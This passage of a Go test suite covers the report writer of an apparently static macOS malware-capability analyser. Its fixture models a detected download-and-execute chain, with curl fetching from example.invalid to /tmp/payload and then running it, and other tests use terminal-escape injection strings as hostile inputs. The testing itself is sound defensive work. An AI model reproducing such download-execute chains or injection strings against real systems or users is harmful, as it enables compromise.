		t.Fatalf("verbose output should retain the existing larger context inventory:\n%s", verbose.String())
	}
}

func TestConciseArtifactPropertyIsBounded(t *testing.T) {
	rep := Report{Artifact: "Sample"}
	for index := 0; index < conciseSecurityLimit+4; index++ {
		rep.ArtifactProperties = append(rep.ArtifactProperties, behavior.ArtifactProperty{
			Kind: "sandbox-profile", Value: fmt.Sprintf("profile-%02d", index), Support: behavior.SupportDirect,
		})
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if strings.Count(got, "sandbox-profile: profile-") != conciseSecurityLimit || !strings.Contains(got, "... 4 more artifact property summaries") {
		t.Fatalf("bounded artifact-property output did not disclose omissions:\n%s", got)
	}
}

func TestArtifactPropertyDisplayDecodesCodeDirectoryFlagsWithoutClaimingTrust(t *testing.T) {
	item := behavior.ArtifactProperty{Kind: "code-signature-flags", Value: "0x10002"}
	got := artifactPropertyDisplayValue(item)
	for _, want := range []string{"0x10002", "CodeDirectory declares", "ad-hoc", "hardened-runtime"} {
		if !strings.Contains(got, want) {
			t.Fatalf("decoded flags %q do not contain %q", got, want)
		}
	}
	for _, forbidden := range []string{"trusted", "verified", "effective"} {
		if strings.Contains(strings.ToLower(got), forbidden) {
			t.Fatalf("decoded structural flags must not claim %q: %q", forbidden, got)
		}
	}

	unknown := artifactPropertyDisplayValue(behavior.ArtifactProperty{Kind: "code-signature-flags", Value: "0x80000000"})
	if !strings.Contains(unknown, "unknown-bits=0x80000000") {
		t.Fatalf("unknown CodeDirectory flags were hidden: %q", unknown)
	}
	if got := artifactPropertyDisplayValue(behavior.ArtifactProperty{Kind: "entitlement", Value: "0x10002"}); got != "0x10002" {
		t.Fatalf("non-flag artifact property was rewritten: %q", got)
	}
}

func TestWriteTextWithOptionsZeroCapabilityCaveat(t *testing.T) {
	var output strings.Builder
	if err := WriteTextWithOptions(&output, Report{Artifact: "unknown", ArtifactNodes: []artifact.Node{{Kind: "file", AnalyzeStatus: "analyzed"}}}, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "0 capabilities · 0 matches") || !strings.Contains(got, "No capability matches are recorded in this report.") || !strings.Contains(got, "not a security verdict") {
		t.Fatalf("zero-match output lacks an explicit caveat:\n%s", got)
	}
	for _, misleading := range []string{"is clean", "is safe", "malware score"} {
		if strings.Contains(strings.ToLower(got), misleading) {
			t.Fatalf("zero-match output contains misleading verdict language %q:\n%s", misleading, got)
		}
	}
}

func TestWriteTextWithOptionsDoesNotBackfillMetadataAcrossRulesets(t *testing.T) {
	rep := Report{
		Artifact:       "saved.json",
		RulesetVersion: "maratus.rules.v0.0",
		ArtifactNodes:  []artifact.Node{{ID: "node-1", LogicalPath: "sample", Kind: "script", AnalyzeStatus: "analyzed"}},
		Capabilities: []behavior.CapabilityMatch{{
			ID: "cap-1", RuleID: "macos.download-execute", Title: "Historical match", Namespace: "macos.execution",
			Support: behavior.SupportCorroborated, Execution: testConnectedExecution(""), SubjectNodeID: "node-1",
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "rule          macos.download-execute") {
		t.Fatalf("retained historical rule ID missing:\n%s", got)
	}
	for _, currentOnly := range []string{"A statically modeled sequence downloads", "T1105", "E1105"} {
		if strings.Contains(got, currentOnly) {
			t.Fatalf("saved historical report was backfilled with current metadata %q:\n%s", currentOnly, got)
		}
	}
}

func TestWriteTextWithOptionsDoesNotBackfillMetadataAcrossCatalogDigests(t *testing.T) {
	rep := Report{
		Artifact:          "saved.json",
		RulesetVersion:    RulesetVersion,
		RuleCatalogDigest: "sha256:" + strings.Repeat("0", 64),
		ArtifactNodes:     []artifact.Node{{ID: "node-1", LogicalPath: "sample", Kind: "script", AnalyzeStatus: "analyzed"}},
		Capabilities: []behavior.CapabilityMatch{{
			ID: "cap-1", RuleID: "macos.download-execute", Title: "Historical match", Namespace: "macos.execution",
			Support: behavior.SupportCorroborated, Execution: testConnectedExecution(""), SubjectNodeID: "node-1",
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "Historical match") || strings.Contains(got, "A statically modeled sequence downloads") || strings.Contains(got, "T1105") || strings.Contains(got, "E1105") {
		t.Fatalf("saved report was backfilled across catalog identities:\n%s", got)
	}
}

func TestWriteTextWithOptionsGroupsEquivalentArchitectureCoverage(t *testing.T) {
	rep := Report{
		Artifact:      "sample",
		ArtifactNodes: []artifact.Node{{Kind: "macho", AnalyzeStatus: "analyzed"}},
		Coverage: []behavior.Coverage{
			{AnalysisArea: "macho-call-correlation/x86_64", Status: "partial", Detail: "bounded call correlation"},
			{AnalysisArea: "macho-call-correlation/arm64", Status: "partial", Detail: "bounded call correlation"},
		},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{
		"Analysis    1 limited scope; details in canonical JSON or --detail full",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("grouped coverage output missing %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "bounded call correlation") || strings.Contains(got, "ANALYSIS NOTES") {
		t.Fatalf("default output exposed detailed coverage notes:\n%s", got)
	}
	var verbose strings.Builder
	if err := WriteTextWithOptions(&verbose, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	if strings.Count(verbose.String(), "bounded call correlation") != 1 || !strings.Contains(verbose.String(), "macho-call-correlation (arm64, x86_64) · partial") {
		t.Fatalf("verbose output did not retain grouped architecture coverage:\n%s", verbose.String())
	}
}

func TestConciseCoverageReportsOnlyCompactIncompleteAnalysisStatus(t *testing.T) {
	const skipped = "instruction-level function-scope analysis is unsupported for i386; structural metadata was still analyzed"
	rep := Report{
		Artifact: "sample",
		Coverage: []behavior.Coverage{
			{AnalysisArea: "macho-function-scope/i386", Status: "skipped", Detail: skipped},
			{AnalysisArea: "macho-call-correlation/arm64", Status: "partial", Detail: "bounded call correlation"},
		},
		Diagnostics: []string{"sample: " + skipped},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "Analysis    2 limited scopes · 1 diagnostic; details in canonical JSON or --detail full") {
		t.Fatalf("default output did not report incomplete analysis compactly:\n%s", got)
	}
	if strings.Contains(got, skipped) || strings.Contains(got, "bounded call correlation") || strings.Contains(got, "ANALYSIS NOTES") {
		t.Fatalf("default output exposed detailed coverage or diagnostic prose:\n%s", got)
	}
}

func TestConciseOutputKeepsDefaultLinesReadable(t *testing.T) {
	rep := presentationFixture()
	rep.Artifact = strings.Repeat("very-long-target/", 20)
	rep.ArtifactNodes[0].LogicalPath = rep.Artifact
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(output.String(), "\n") {
		if width := len([]rune(line)); width > conciseContentWidth+4 {
			t.Fatalf("concise line is %d columns, want at most %d:\n%s", width, conciseContentWidth+4, line)
		}
	}
}

func TestCoverageForPresentationKeepsGeneralAndArchitectureScopesDistinct(t *testing.T) {
	items := coverageForPresentation([]behavior.Coverage{
		{AnalysisArea: "macho-analysis", Status: "partial", Detail: "same detail"},
		{AnalysisArea: "macho-analysis/arm64", Status: "partial", Detail: "same detail"},
	})
	if len(items) != 2 {
		t.Fatalf("general and architecture-specific coverage were merged: %#v", items)
	}
}

func TestWriteTextWithOptionsColorDoesNotPermitTerminalInjection(t *testing.T) {
	rep := Report{
		Artifact: "bad\x1b[2J\nname",
		ArtifactNodes: []artifact.Node{{
			LogicalPath: "bad\x1b[31m", Kind: "script", AnalyzeStatus: "analyzed",
		}},
		Capabilities: []behavior.CapabilityMatch{{
			RuleID: "rule\x1b[2J", Title: "title\rforged", Namespace: "namespace\u202e",
			Support: behavior.SupportCorroborated, Execution: testConnectedExecution(""),
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVerbose, Color: true}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "\x1b[1;36mMARATUS\x1b[0m") {
		t.Fatalf("expected structural ANSI styling:\n%q", got)
	}
	for _, unsafe := range []string{"\x1b[2J", "\x1b[31m", "title\rforged", "namespace\u202e"} {
		if strings.Contains(got, unsafe) {
			t.Fatalf("untrusted terminal control was emitted raw %q:\n%q", unsafe, got)
		}
	}
	for _, escaped := range []string{`bad\x1b[2J\nname`, `rule\x1b[2J`, `title\rforged`, `namespace\u202e`} {
		if !strings.Contains(got, escaped) {
			t.Fatalf("escaped value %q missing:\n%q", escaped, got)
		}
	}
}

func TestWriteTextWithOptionsBoundsNetworkUnresolvedDetailsAndSources(t *testing.T) {
	const extra = 3
	rep := Report{Artifact: "Sample.app"}
	var evidenceIDs []string
	for i := 0; i < textSourceLimit+extra; i++ {
		nodeID := fmt.Sprintf("node-%02d", i)
		evidenceID := fmt.Sprintf("ev-%02d", i)
		rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
			ID: nodeID, LogicalPath: fmt.Sprintf("Sample.app/Contents/Helpers/Helper-%02d", i),
			Kind: "macho", AnalyzeStatus: "analyzed",
		})
		rep.Evidence = append(rep.Evidence, behavior.Evidence{ID: evidenceID, NodeID: nodeID, Logical: fmt.Sprintf("Helper-%02d", i)})
		evidenceIDs = append(evidenceIDs, evidenceID)
	}
	unresolved := make([]string, textDestinationLimit+extra)
	for i := range unresolved {
		unresolved[i] = fmt.Sprintf("detail-%02d", i)
	}
	rep.NetworkImplementations = []behavior.NetworkImplementationObservation{{Kind: behavior.NetworkImplementationDynamicLinkage, SubjectNodeID: "node-00", APIOrTool: "fixture", EvidenceIDs: evidenceIDs, UnresolvedProperties: unresolved}}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if strings.Count(got, "source        Helper-") != textSourceLimit || !strings.Contains(got, "source        ... 3 more") {
		t.Fatalf("network sources were not bounded:\n%s", got)
	}
	if strings.Count(got, "unresolved    detail-") != textDestinationLimit || !strings.Contains(got, "unresolved    ... 3 more") {
		t.Fatalf("network unresolved details were not bounded:\n%s", got)
	}
}

func TestWriteTextWithOptionsEscapesAndBoundsQualifierKeys(t *testing.T) {
	qualifiers := make(map[string]string, textQualifierLimit+3)
	qualifiers["bad\x1b[2J\nforged"] = "value"
	for i := 0; i < textQualifierLimit+2; i++ {
		qualifiers[fmt.Sprintf("qualifier-%02d", i)] = "value"
	}
	rep := Report{
		Artifact:      "sample",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "sample", Kind: "script", AnalyzeStatus: "analyzed"}},
		Operations: []behavior.ModeledOperation{{
			ID: "operation-1", SubjectNodeID: "node-1", Kind: behavior.OperationFileRead,
			ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "fixture"))),
			Support:          behavior.SupportCorroborated, Execution: testConnectedExecution(""), Qualifiers: qualifiers,
		}},
		Features: []behavior.Feature{{
			ID: "sig-1", NodeID: "node-1", Key: "command.tool", Value: "fixture", Support: behavior.SupportCorroborated, Qualifiers: qualifiers,
		}},
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if strings.Contains(got, "\x1b[2J") || strings.Contains(got, "bad\x1b") || strings.Contains(got, "\nforged") {
		t.Fatalf("untrusted qualifier key was emitted as terminal control or a forged line:\n%q", got)
	}
	if strings.Count(got, "qualifier     ... 3 more") != 2 {
		t.Fatalf("operation and feature qualifier rows were not bounded:\n%s", got)
	}
}

func TestWriteTextWithOptionsLabelsFeatureExecutionAndReportsEvidenceOmission(t *testing.T) {
	rep := Report{
		Artifact:      "sample",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "sample", Kind: "script", AnalyzeStatus: "analyzed"}},
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID: "root-1", DeclarationNodeID: "node-1", StartNodeID: "node-1", Kind: "launchd-program", Name: "com.example.agent",
		}},
		Operations: []behavior.ModeledOperation{{
			ID: "operation-1", SubjectNodeID: "node-1", Kind: "fixture", Support: behavior.SupportCorroborated,
			Execution: testConnectedExecution("root-1"),
		}},
		Features: []behavior.Feature{{
			ID: "sig-1", NodeID: "node-1", Key: "command.tool", Value: "fixture",
			Support: behavior.SupportCorroborated, Execution: testConnectedExecution("root-1"),
		}},
	}
	for i := 0; i < textEvidenceLimit+2; i++ {
		id := fmt.Sprintf("ev-%02d", i)
		rep.Evidence = append(rep.Evidence, behavior.Evidence{ID: id, NodeID: "node-1", Logical: "sample", Method: "fixture", Kind: "fixture", Value: id})
		rep.Operations[0].EvidenceIDs = append(rep.Operations[0].EvidenceIDs, id)
		rep.NetworkImplementations = []behavior.NetworkImplementationObservation{{Kind: behavior.NetworkImplementationDynamicLinkage, SubjectNodeID: "node-1", APIOrTool: "fixture", EvidenceIDs: append([]string(nil), rep.Operations[0].EvidenceIDs...)}}
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if strings.Count(got, "execution roots  root-1") != 2 {
		t.Fatalf("operation and feature did not share the execution-root ownership set:\n%s", got)
	}
	if strings.Count(got, "evidence      ... 2 more") != 2 {
		t.Fatalf("network and operation evidence omission was not explicit:\n%s", got)
	}
}

func TestPresentationWritersPropagateWriteErrors(t *testing.T) {
	want := errors.New("write failed")
	writers := []struct {
		name string
		fn   func() error
	}{
		{name: "report", fn: func() error {
			return WriteTextWithOptions(errorWriter{err: want}, presentationFixture(), TextOptions{})
		}},
		{name: "rules", fn: func() error { return WriteRulesText(errorWriter{err: want}, ListRules(), TextOptions{}) }},
	}
	for _, item := range writers {
		t.Run(item.name, func(t *testing.T) {
			if err := item.fn(); !errors.Is(err, want) {
				t.Fatalf("write error = %v, want %v", err, want)
			}
		})
	}
}

type errorWriter struct {
	err error
}

func (w errorWriter) Write([]byte) (int, error) {
	return 0, w.err
}

func presentationFixture() Report {
	return Report{
		SchemaVersion: SchemaVersion, Tool: "maratus", ToolVersion: "v0.1.0", ToolCommit: "0123456789abcdef", ToolModified: true, RulesetVersion: RulesetVersion, RuleCatalogDigest: rules.CatalogDigest(),
		Artifact: "sample.app",
		Analysis: AnalysisMetadata{Architecture: "all"},
		ArtifactNodes: []artifact.Node{
			{ID: "node-1", LogicalPath: "sample.app", Kind: "app-bundle", MediaType: "application/x-apple-bundle", SHA256: strings.Repeat("a", 64), AnalyzeStatus: "analyzed"},
			{ID: "node-2", ParentID: "node-1", LogicalPath: "sample.app/Contents/MacOS/sample", Kind: "macho", AnalyzeStatus: "partial", Architectures: []string{"arm64"}},
		},
		Relationships: []artifact.Edge{{From: "node-1", To: "node-2", Kind: "contains"}},
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID: "root-test", DeclarationNodeID: "node-1", StartNodeID: "node-2", Kind: "application", Name: "sample",
		}},
		Capabilities: []behavior.CapabilityMatch{{
			RuleID: "macos.download-execute", Title: "Downloads and executes a payload", Namespace: "macos.execution",
			Support: behavior.SupportDirect, Execution: testConnectedExecution(""), SubjectNodeID: "node-2",
			AffectedResources: []behavior.Resource{{Kind: behavior.ResourceFile, Value: "/tmp/payload"}},
			OperationIDs:      []string{"operation-1", "operation-2"},
			EvidenceIDs:       []string{"evidence-1"},
			Attack:            []string{"T1105"}, MBC: []string{"E1105"},
			MatchTrace: []behavior.MatchTraceClause{
				{Path: "match.resource_flow.steps[0].operation", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
				{Path: "match.resource_flow.steps[1].operation", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-2"}},
			},
		}},
		Evidence: []behavior.Evidence{{
			ID: "evidence-1", NodeID: "node-2", Logical: "sample.app/Contents/MacOS/sample", Method: "fixture", Kind: "call", Value: "curl",
		}},
		Operations: []behavior.ModeledOperation{
			{ID: "operation-1", SubjectNodeID: "node-2", Kind: "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.Resource{Kind: behavior.ResourceURL, Value: "https://example.invalid/payload"})), EvidenceIDs: []string{"evidence-1"}, Support: behavior.SupportDirect, Execution: testConnectedExecution("")},
			{ID: "operation-2", SubjectNodeID: "node-2", Kind: "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), EvidenceIDs: []string{"evidence-1"}, Support: behavior.SupportDirect, Execution: testConnectedExecution("")},
		},
		Features:               []behavior.Feature{{Key: "command.tool", Value: "curl", Support: behavior.SupportDirect}},
		NetworkImplementations: []behavior.NetworkImplementationObservation{{Kind: behavior.NetworkImplementationToolInvocation, SubjectNodeID: "node-2", OperationIDs: []string{"operation-1"}, APIOrTool: "curl", HTTPImplementation: "libcurl", UnresolvedProperties: []string{"proxy policy"}, EvidenceIDs: []string{"evidence-1"}, Support: behavior.SupportDirect, Execution: testConnectedExecution("")}},
		ArtifactProperties:     []behavior.ArtifactProperty{{NodeID: "node-2", Kind: "entitlement", Value: "com.apple.security.network.client", Support: behavior.SupportDirect}},
		Coverage:               []behavior.Coverage{{NodeID: "node-2", AnalysisArea: "macho-instructions", Status: "partial", Detail: "bounded instruction decoding"}},
	}
}
